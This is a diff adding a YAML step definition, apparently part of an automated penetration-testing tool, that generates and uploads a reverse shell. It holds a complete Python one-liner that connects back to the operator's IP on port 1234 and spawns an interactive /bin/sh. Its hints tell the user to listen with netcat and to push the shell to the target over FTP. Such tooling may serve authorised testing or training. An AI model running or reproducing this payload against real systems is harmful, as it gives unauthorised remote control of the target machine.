@@ -1,0 +1,13 @@
+description: create and upload python reverse shell
+function: create_file
+In: [myIP, ftp_sh_filename]
+condition:
+  - ftp in Service 
+Out: []
+argument:
+  - |
+    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("REPLACE_IT_myIP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+  - Data['ftp_sh_filename']
+hint:
+  - Open another terminal, enter `nc -lnvp 1234` to listen to port.
+  - Enter `put /home/{getpass.getuser()}/Desktop/{Data['ftp_sh_filename']} {Data['ftp_sh_filename']}` to upload reverse shell by ftp.
